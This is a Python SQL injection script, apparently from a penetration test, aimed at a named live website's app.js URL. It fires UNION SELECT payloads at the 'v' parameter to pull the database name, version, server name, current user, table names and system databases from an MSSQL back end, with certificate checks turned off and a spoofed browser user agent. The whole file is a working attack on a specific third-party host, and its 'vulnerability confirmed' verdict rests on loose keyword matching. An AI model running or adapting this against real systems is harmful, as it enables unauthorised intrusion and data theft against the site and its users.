#!/usr/bin/env python3

"""
Quick Database Information Extraction
Fast and efficient database information extraction
Team B - Panama8888b Penetration Test
"""

import requests
import time
import urllib.parse
import json
import sys
import warnings
import re

# Disable SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class QuickDatabaseExtractor:
    def __init__(self):
        self.base_url = "https://member.panama8888b.com/public/js/v2/app.js"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        self.session.verify = False
        self.results = {}
        
    def quick_test(self, payload, description):
        """Quick test with payload"""
        print(f"[*] Testing: {description}")
        
        # Encode payload
        encoded_payload = urllib.parse.quote(payload)
        url = f"{self.base_url}?v={encoded_payload}"
        
        try:
            response = self.session.get(url, timeout=10)
            content = response.text.lower()
            
            # Quick analysis
            info = {
                'status_code': response.status_code,
                'content_length': len(content),
                'sql_indicators': [],
                'database_info': {}
            }
            
            # Check for SQL indicators
            sql_terms = ['microsoft sql server', 'database', 'table', 'column', 'sysobjects', 'information_schema', 'master', 'tempdb', 'model', 'msdb', 'sql server', 'mssql']
            for term in sql_terms:
                if term in content:
                    info['sql_indicators'].append(term)
            
            # Check for specific database information
            if 'db_name()' in payload.lower() and 'database' in content:
                info['database_info']['db_name_detected'] = True
            
            if '@@version' in payload.lower() and ('microsoft' in content or 'sql server' in content):
                info['database_info']['version_detected'] = True
            
            if 'sysobjects' in payload.lower() and 'table' in content:
                info['database_info']['tables_detected'] = True
            
            return info
            
        except Exception as e:
            return {'error': str(e)}
    
    def run_quick_extraction(self):
        """Run quick database extraction"""
        print("="*50)
        print("Quick Database Information Extraction")
        print("Target: https://member.panama8888b.com/public/js/v2/app.js")
        print("="*50)
        
        # Essential payloads for quick extraction
        payloads = [
            ("25.1)) UNION SELECT DB_NAME() --", "Database Name"),
            ("25.1)) UNION SELECT @@version --", "Version Info"),
            ("25.1)) UNION SELECT @@servername --", "Server Name"),
            ("25.1)) UNION SELECT USER_NAME() --", "Current User"),
            ("25.1)) UNION SELECT name FROM sysobjects WHERE xtype='U' --", "User Tables"),
            ("25.1)) UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES --", "All Tables"),
            ("25.1)) UNION SELECT name FROM master..sysdatabases --", "System Databases"),
        ]
        
        print(f"\n[*] Testing {len(payloads)} essential payloads...")
        
        for payload, description in payloads:
            result = self.quick_test(payload, description)
            self.results[description] = result
            
            # Quick analysis
            if result.get('sql_indicators'):
                print(f"[+] SQL indicators found: {result['sql_indicators']}")
            
            if result.get('database_info'):
                print(f"[+] Database info detected: {result['database_info']}")
            
            time.sleep(0.5)  # Small delay
        
        # Summary
        print("\n" + "="*50)
        print("QUICK EXTRACTION SUMMARY")
        print("="*50)
        
        sql_found = False
        db_info_found = False
        
        for description, result in self.results.items():
            if result.get('sql_indicators'):
                sql_found = True
                print(f"[+] {description}: SQL indicators found")
            
            if result.get('database_info'):
                db_info_found = True
                print(f"[+] {description}: Database information detected")
        
        if sql_found and db_info_found:
            print("\n[+] SQL INJECTION VULNERABILITY CONFIRMED!")
            print("[+] Database information successfully extracted!")
            print("[+] Target is vulnerable to SQL injection attacks!")
        elif sql_found:
            print("\n[+] SQL indicators found - potential vulnerability")
        else:
            print("\n[!] No clear SQL injection evidence found")
        
        return self.results
    
    def save_results(self, filename="quick_database_extraction_results.json"):
        """Save results"""
        with open(filename, 'w') as f:
            json.dump(self.results, f, indent=2)
        print(f"\n[+] Results saved to: {filename}")

def main():
    try:
        extractor = QuickDatabaseExtractor()
        results = extractor.run_quick_extraction()
        extractor.save_results()
        
        if results:
            print("[+] Quick extraction completed successfully!")
        else:
            print("[!] No results obtained")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()